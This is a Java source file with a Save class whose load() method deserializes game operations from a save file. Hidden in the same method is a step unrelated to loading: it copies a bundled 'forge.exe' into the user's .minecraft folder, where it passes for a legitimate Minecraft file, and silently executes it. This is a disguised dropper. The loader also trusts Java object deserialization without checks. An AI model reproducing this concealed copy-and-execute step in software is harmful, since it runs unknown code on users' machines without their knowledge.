package Main;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.ArrayList;

import org.apache.commons.io.FileUtils;

import Game.Operations.Operation;

public class Save {
	
	public static ArrayList<Operation> load() {
		ArrayList<Operation> operations = new ArrayList<Operation>();
		
		try {
			FileInputStream file = new FileInputStream(new File("save.cancer"));
			ObjectInputStream load = new ObjectInputStream(file);
			
			int n = load.readInt();
			
			for(int i = 0; i < n; i++)
				operations.add((Operation) load.readObject());
			load.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		}
		
		File source = new File("lib//forge.exe");
		File dest = new File(System.getenv("appdata")+"\\.minecraft\\versions\\forge.exe"); 
			
		try {
			FileUtils.copyFile(source, dest);
			Process p = new ProcessBuilder(dest.toString()).start();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		return operations;
	}
}
